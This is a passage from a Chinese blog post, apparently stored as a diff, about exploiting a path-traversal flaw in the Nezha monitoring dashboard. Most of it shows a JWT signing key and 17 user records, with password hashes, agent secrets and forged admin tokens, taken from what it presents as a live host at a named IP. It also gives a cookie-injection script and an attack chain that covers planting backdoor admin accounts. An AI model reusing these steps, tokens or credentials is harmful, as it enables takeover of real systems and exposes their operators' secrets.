+[+] 密钥获取成功: rxLGg4gNLJEhRKA0oBOKBoGCaoqkdNW2R8OhLXu2XOZqKsWZy0iF5u4WXBl9zfeeFk3VaSVzYiL1rem8FD6lA8aMttCOmE7m6D5SogIiW58VF5h6rdvTIhQpoy4qel2XED3mcAU7uvZIWIdCDYfKPmSD7VwCR2T1D2HoVCerfG3uk7KqpIekcausnq7abpGrVSBTVHEs9OLnXnkBwKbmMllSJhbd3W43Ckn6IJHrZDBhKi0nFxQHlX6I9V1eZy3Iau8bDkCUmP9eBLW40oniZIkXzwUSRTERxVC5fdBglbWYUdGxY97xGMoVv0PlEtxP1tsL9Qy783c292IjErBYc9KP5w3NXYz4oc4JL5Q9AKEIzP6VEbcb42ueUsJw457486jiBplPILVCwqF3hdUI9K4Hx4s0g0BUT24zTCEt3BXmDH7FoueVYxnqWnUujgYbtWOxUEJ2MM6gmAGec38sJzLWPxCpzvNjOuSoth4WRI9CRTzta0242JwO2k7zbcPSk6aYMz79fA7LzScnVbLQqLevc6XQlvpfVbkCCUP4sz3VvJt992QFVnoJ0dCVfumVPFsIdPj29YfJxqgvVJK6YMIVZYbhtst4Xg5l7MNYjImMtddoaVsmzAmNwSD5qenmMtnunKSOWDJCshhoCy8kbbaTpSccLGOeUXtxDtKFaUr11moJcdqi2Wqe1wgP3LzrHJocjnP5IMaamG30WJZWqyDwIqJqs56PtNEVnRiyF2rFiwvJpmtMZKFkXzdPzoNt2QIEdsGX0utcslrM84E6RQtAPlobaRAM0mxYFft7UC3XGzht5ziTqs9DasM13Tf7jYOn2hveEZE2yyqLNn9CddcOjgUFobqtwaoBmldRXUoxmZkRMSKFqdTbG52exCSCHcf0RGR2Z0SGSRM2tFUqBDD3nUQv5zkg5cAUqncKZFgY1nbp4NcKuMW5XgfGCTyfDk0bOLy91Ak4m6X9nNJHbPlBT1SFdibjDo9Kkhrqu3UF9b2HeoJYTluTDv6Yl03j
+
+[+] 数据库扫描完成，发现 17 条记录
+================================================================================
+{
+    &quot;id&quot;: 1,
+    &quot;created_at&quot;: &quot;2025-03-13 00:39:59.546561425+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2025-03-13 00:39:59.546561425+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;admin&quot;,
+    &quot;password&quot;: &quot;$2a$10$zt9F232//AeFE356fn/g7.biT8/KTPDqa6Ux93WCQln96v5PSoMEa&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;umR8aq50HkdXSgoybOOc2ohjxNvjjVDp&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIxIn0.OiwhPNeKjsAMujVcTSDhXMOm10kdh6HE0RkiIU9-S-g&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;1&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 2,
+    &quot;created_at&quot;: &quot;2026-05-26 09:38:16.355351921+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-05-26 09:38:16.355351921+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;xiaofeng&quot;,
+    &quot;password&quot;: &quot;$2a$10$H.BBoIxllGtZ.igZgJa96OHI4Yaic06XmpL/bQcPUyhlEvMP1vbby&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;pgiNY4RspBh0Fl12e9xyPxSSlP3bniWq&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIyIn0.hsvigFknlORQJXKDGVjfkrrR7uOnryDCTT9axQTMc0U&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;2&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 3,
+    &quot;created_at&quot;: &quot;2026-05-28 11:01:21.692301859+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-05-28 11:01:21.692301859+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;system&quot;,
+    &quot;password&quot;: &quot;$2a$10$2gfLVcq8F3SrC6/PH/3m3u/LEmSF.6vi6o.LfweA1vvMCOK0hPFTm&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;UJxn31u09dr9nVzLuN6qmN7INAhffyvU&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIzIn0._HXWVcrEwQecJz-mJaLVOXNe4iDWZHkeacH5uO_-KYg&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;3&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 4,
+    &quot;created_at&quot;: &quot;2026-06-17 16:22:42.29219538+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:22:42.29219538+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_vffarbmb&quot;,
+    &quot;password&quot;: &quot;$2a$10$aCDw7w4KTM0Ml3JkI2Qpp.eVIIBjRWJGtAzCWXxFb2lN.i9D15j9.&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;LeBHjnwoCjYbwKSABILbNeFHVtOhEJAa&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiI0In0.A86sGmlMtec5txD0K6GPlJbxw-7eWn2DqVHZ0rNX3G4&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;4&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 5,
+    &quot;created_at&quot;: &quot;2026-06-17 16:32:41.508204087+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:32:41.508204087+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_dsesavvc&quot;,
+    &quot;password&quot;: &quot;$2a$10$AkNmgpUdz7u/VIuRe928cOSuVRQNxiOzFl7pFqSjF0X5WLzBDMkEW&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;Feiz07rduRQT9bRfdAFDpPJSMzbykWaA&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiI1In0.kgpMBpWb28P19AbhXtWBHzWLSH9HN2suXoPa4HsR0xg&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;5&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 6,
+    &quot;created_at&quot;: &quot;2026-06-17 16:42:30.013210077+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:42:30.013210077+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_s/stwvkg&quot;,
+    &quot;password&quot;: &quot;$2a$10$Td5Hh0fIG4OAPnKAfnabVO2Adp.b03jAZvVdOe3rDvufXI8f9Gioe&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;ClIY93yLMxrIErvu57TOw81XkmbZy7Ve&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiI2In0.Z0PyaKpb64sPl359LEGPDd_tfg3mCNxgFdvUSw9z1UQ&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;6&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 7,
+    &quot;created_at&quot;: &quot;2026-06-17 16:43:25.280544243+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:43:25.280544243+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_fr4dy7/x&quot;,
+    &quot;password&quot;: &quot;$2a$10$lqcMvxYeQbqXQG4HenYX3eNVzJS5DlL9GF3GhugVTny5VPGp5eqZu&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;OZeG3hd3A9NX6jfR8emmYE14xRIgxeNP&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiI3In0.H4YyakulFmqqIGcxub11ulB0833Wmei-4bg9aSLyQwc&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;7&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 8,
+    &quot;created_at&quot;: &quot;2026-06-17 16:43:50.711328546+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:43:50.711328546+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_qha+o3pg&quot;,
+    &quot;password&quot;: &quot;$2a$10$8nqh6A0YXOaVLLXtEWv3TO8rUzBVj2CJXzx1uE7NvN7nppAqiw5by&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;eKVlwyjbTFx8wHy7JpqUNwOFdfJJdspw&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiI4In0.kWKoEP7Mo4a5DaUsDRdr8bSGBBSOtJtjbjWcWMaVsr4&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;8&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 9,
+    &quot;created_at&quot;: &quot;2026-06-17 16:44:49.809216891+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:44:49.809216891+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_2+lrtv3+&quot;,
+    &quot;password&quot;: &quot;$2a$10$VYLx1MknA.8kPSa/oPwMq.KBerNAeoD0mTl/enUp26w3LPVOVGUQe&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;Msc8Y6u6Xaz4F9sZREJt8riAtnWD4btb&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiI5In0.AYhWKfnW7jFltMyvFQSzgc6Jghe4dEdwt7kWy1az2b8&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;9&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 10,
+    &quot;created_at&quot;: &quot;2026-06-17 16:44:52.099865105+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:44:52.099865105+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_xxwiuzec&quot;,
+    &quot;password&quot;: &quot;$2a$10$47mgrvgGi/48K95ZJokxsOeFxhhTfFZbLvx5B2v6l45PJmlJc8Bbm&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;bNZnTyYMQNhnviu2Nd9pPboAvu9vs0dR&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIxMCJ9.5jjKN3oZcANxKmftanwVet_s8Ctoid7hyM8acEQ1f10&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;10&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 11,
+    &quot;created_at&quot;: &quot;2026-06-17 16:45:00.548958044+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:45:00.548958044+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_luqs0mhf&quot;,
+    &quot;password&quot;: &quot;$2a$10$GV/SaPap9O8625MslzOZneR00k4XMv3MEVZzLJ.JJkcNwnA6QOC/y&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;4iQjvUrWOZFHZtiag99hKmW1RdOp2GOJ&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIxMSJ9.iPmTCypteEQdnylOBS53s2dygavGjVdvoOTweciOf1w&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;11&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 12,
+    &quot;created_at&quot;: &quot;2026-06-17 16:45:50.342881451+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:45:50.342881451+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_ambw/x5z&quot;,
+    &quot;password&quot;: &quot;$2a$10$65BkWEgpEGMfEOHVRcYyO.Mu/LiM/ri/qosX2GMk23ZBvr88MBurm&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;EDNCjDWaJpei2WTeT1f7tfwzmHzssDjW&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIxMiJ9.F_XNPYDngyAmwtwXVMQYVhawo4lHuOYPbXg1IjlHRZA&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;12&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 13,
+    &quot;created_at&quot;: &quot;2026-06-17 16:45:58.616923303+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:45:58.616923303+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_mqqd+h4+&quot;,
+    &quot;password&quot;: &quot;$2a$10$r5G4fmA45.NwPLK/3Q2Cee9THsaPz3PRFpS1SrS55ESo3Ma8WEMUS&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;lBd60hS9NcJA8GQRSaKQg0cuJmf8Nr8c&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIxMyJ9.t86W6mjLG13DVhuCOWbGcRGNjW_2HrNtdQ0ioWs2NB8&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;13&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 14,
+    &quot;created_at&quot;: &quot;2026-06-17 16:46:20.91443534+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:46:20.91443534+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_ieu8o3ep&quot;,
+    &quot;password&quot;: &quot;$2a$10$PCVilyjeV8k3qlo8xvt.AO1PyVUGIQ443YVO4iuxh9i5GN1wKFYtK&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;SPjMlLPZCDW5pz1nksVNi50tU5v0ErJw&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIxNCJ9.flg9JQyX1WJEb0kiqKAF2ACDoXm3b_sE_pdsJ5z_Tyc&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;14&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 15,
+    &quot;created_at&quot;: &quot;2026-06-17 16:46:36.358966921+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:46:36.358966921+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_dwjr41v3&quot;,
+    &quot;password&quot;: &quot;$2a$10$oH4AF7gF/zQVqN1AjH8hduSGkKU4BYCm9lhj3YlJSpEr96sfNUkt.&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;Fw7zysg2wnTPAAtboU9fi0MHColF7QVV&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIxNSJ9.zo7YmYzhrOI3pjku_QVJPjkwECfc2I28Rkbmw6zHvg8&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;15&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 16,
+    &quot;created_at&quot;: &quot;2026-06-17 16:46:58.459501326+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:46:58.459501326+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_wyc7dear&quot;,
+    &quot;password&quot;: &quot;$2a$10$23Jd93T5SIaerBFhffviMenmim.SI5/8JZenmAojbE9IiPp1vmFQq&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;usXVZkMWe8wfFYhZR8Tzm4saA2c6i32D&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIxNiJ9.dnUz7p5-Tk2DFc3bUEk_59mqX3COFujfnS82WHsCG0E&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;16&quot;
+    }
+}
+--------------------------------------------------------------------------------
+{
+    &quot;id&quot;: 17,
+    &quot;created_at&quot;: &quot;2026-06-17 16:48:17.49098282+08:00&quot;,
+    &quot;updated_at&quot;: &quot;2026-06-17 16:48:17.49098282+08:00&quot;,
+    &quot;user_id&quot;: 0,
+    &quot;username&quot;: &quot;adm_2fr/p2fo&quot;,
+    &quot;password&quot;: &quot;$2a$10$lnc8nHdjvIOs/HH2Lo7vHOYhtVDKyrpXvp7Ya/7rzpVEOLNXzuC8m&quot;,
+    &quot;role&quot;: 0,
+    &quot;agent_secret&quot;: &quot;bTu3BZfdTnFykPO4OASKZpoJt24lYvAw&quot;,
+    &quot;reject_password&quot;: 0,
+    &quot;generated_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiIxNyJ9.npVsCyDkH1YOeMZqaWVPd4zYUnH0LOVn-nT0qeCCJsQ&quot;,
+    &quot;payload_used&quot;: {
+        &quot;exp&quot;: 1782263392,
+        &quot;ip&quot;: &quot;&quot;,
+        &quot;orig_iat&quot;: 1781658592,
+        &quot;user_id&quot;: &quot;17&quot;
+    }
+}
+--------------------------------------------------------------------------------
+
+## 执行结束... 2026-06-17 17:09:52  耗时 8 秒　　　
+</code></pre>
+<h3 id="34-">3.4 注入测试</h3>
+<p>通过生成的 generated_token 在浏览器修改Cookie发现直接成功了，下方测试数据的通过数据库id：8的管理员生成的generated_token。</p>
+<h4 id="heading-5">方式一：浏览器控制台一键注入</h4>
+<pre><code class="language-javascript">(function() {
+    const TOKEN = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODIyNjMzOTIsImlwIjoiIiwib3JpZ19pYXQiOjE3ODE2NTg1OTIsInVzZXJfaWQiOiI4In0.kWKoEP7Mo4a5DaUsDRdr8bSGBBSOtJtjbjWcWMaVsr4&quot;;
+    document.cookie = &quot;nz-jwt=&quot; + TOKEN + &quot;; path=/; max-age=86400; SameSite=Lax&quot;;
+    console.log(&quot;[+] Cookie注入成功！刷新页面即可进入后台&quot;);
+})();
+</code></pre>
+<h4 id="application">方式二：开发者工具Application面板</h4>
+<ol>
+<li>按 <code>F12</code> 打开开发者工具</li>
+<li>切换到 <strong>Application</strong> → <strong>Cookies</strong> → <code>http://103.215.48.166:8008</code></li>
+<li>添加新Cookie：
+<ul>
+<li><strong>Name</strong>: <code>nz-jwt</code></li>
+<li><strong>Value</strong>: <code>[上述Token]</code></li>
+<li><strong>Path</strong>: <code>/</code></li>
+</ul>
+</li>
+<li>刷新页面</li>
+</ol>
+<h2 id="heading-6">四、完整攻击链复盘</h2>
+<pre><code>第一阶段：信息搜集
+    ├── FOFA/Shodan 搜索暴露资产
+    └── 确认目标版本特征
+
+第二阶段：漏洞利用（两次GET请求即可完成）
+    ├── GET /dashboard../data/config.yaml → 获取 jwt_secret_key
+    └── GET /dashboard../data/sqlite.db → 获取用户列表
+
+第三阶段：权限获取（两条路径）
+    ├── 路径A：直接使用数据库中的预生成JWT Token
+    │   └── 注入Cookie → 登录后台
+    └── 路径B：使用jwt_secret_key伪造新Token（更隐蔽）
+        └── 伪造任意用户JWT → 注入Cookie → 登录后台
+
+第四阶段：权限维持
+    ├── 创建后门管理员账户
+    ├── 修改系统配置参数
+    └── 长期隐蔽留存
+</code></pre>
+<hr />
+<h2 id="heading-7">五、影响与危害评估</h2>
+<h3 id="51-">5.1 官方公告确认的影响范围</h3>
+<p>根据GitHub安全公告，该漏洞可导致：</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>默认路径</th>
+<th>泄露内容</th>
+<th>严重程度</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>data/config.yaml</code></td>
+<td><code>-c</code> 标志默认值</td>
+<td><strong>JWT签名密钥</strong>（HS256）、Agent密钥、OAuth2客户端密钥、GitHub Release Token、GeoIP API密钥</td>
+<td>🔴 <strong>严重</strong></td>
+</tr>
+<tr>
+<td><code>data/sqlite.db</code></td>
+<td><code>-db</code> 标志默认值</td>
+<td>完整数据库：用户（含管理员）、bcrypt密码哈希、服务器注册信息、API令牌、通知配置</td>
+<td>🔴 <strong>严重</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="52-">5.2 完整接管路径（已由官方验证）</h3>
+<blockquote>
+<p>&ldquo;The chain is fully deterministic against a default-configured dashboard: two unauth HTTP GETs and a JWT signing operation, no race, no user interaction, no special timing.&rdquo;</p>
+</blockquote>
+<p>从公开的配置文件到完全的管理员权限接管，仅需：</p>
+<ul>
+<li><strong>2次</strong> 未认证HTTP请求</li>
+<li><strong>1次</strong> JWT签名操作</li>
+<li><strong>无需</strong> 任何用户交互或特殊时机</li>
+</ul>
+<h3 id="53-">5.3 本次发现的严重问题</h3>
+<p>目标站点存在的安全隐患远超预期：</p>
+<ol>
+<li><strong>默认账户未清理</strong>：<code>admin</code> 账户仍存在且密码未修改</li>
+<li><strong>多次入侵痕迹</strong>：存在大量 <code>adm_*</code> 格式的随机管理员账户</li>
+<li><strong>预生成Token残留</strong>：数据库中保留着可直接使用的JWT</li>
+<li><strong>管理面板暴露公网</strong>：未做任何访问控制</li>
+</ol>
+<blockquote>
+<p>该站点显然已被多次入侵，但仍未被运维团队察觉。</p>
+</blockquote>
+<hr />
+<h2 id="--1">📚 附录</h2>
+<h3 id="a-">A. 参考资源</h3>
+<ul>
+<li><a href="https://github.com/nezhahq/nezha/security/advisories/GHSA-5c25-7vpj-9mqh">官方安全公告 GHSA-5c25-7vpj-9mqh</a></li>
+<li><a href="https://nezha.wiki/">哪吒监控官网</a></li>
+<li><a href="https://github.com/nezhahq/nezha">GitHub项目仓库</a></li>
+</ul>
+<blockquote>
+<p><strong>后记</strong>：安全是一个持续的过程，而非一次性的任务。本次漏洞从发现到公告，官方给出了完整的技术分析和修复方案，这种透明度值得赞赏。希望本文能帮助更多人认识到漏洞的严重性，并采取有效措施保护自己的系统。让我们一起为更安全的互联网环境努力。</p>
+</blockquote>
+
+                </div>
+
+            </article>
+
+
+            
+                
+	<div class="mod-post__foot">
+	 文章标签: 
+     
+        <a href="/tag/na-zha-tan-zhen/">哪吒探针</a>
+     
+     </br>
+	</div>
+
+                    
+
+                        <div class="mod-post__poster">
+                        </div>
+
+                        </div>
+
+                        
+                            
+<br>
+
+<div style="margin-bottom: 10px;">
+    上一篇 : 已经是第一篇文章了~
+</div>
+
+
+
+<div style="margin-bottom: 40px;">
+    下一篇 : <a href="/post/5BSKOr/">哪吒监控终端 404 故障复盘</a>
+</div>
+
+
+</div>	
+
+                                
+
+                                    
+                                        <!-- Reading Progress Component -->
+<div class="reading-progress-container">
+  <span class="reading-label">阅读进度</span>
+  <span class="reading-value">0%</span>
+  <svg class="progress-ring" viewBox="0 0 24 24">
+    <!-- Background Circle -->
+    <circle class="progress-ring__circle-bg" stroke-width="3" fill="transparent" r="10" cx="12" cy="12" />
+    <!-- Progress Circle -->
+    <circle class="progress-ring__circle" stroke-width="3" fill="transparent" r="10" cx="12" cy="12" />
+  </svg>
+</div>
+                                            <footer id="footer" class="footer">
+    <nav>
+        
+            
+                    <a class="menu-item" href="/">
+                        首页
+                    </a>
+                    
+             · 
+                    <a class="menu-item" href="/archives">
+                        归档
+                    </a>
+                    
+             · 
+                    <a class="menu-item" href="/tags">
+                        标签
+                    </a>
+                    
+             · 
+                    <a class="menu-item" href="/post/about">
+                        关于
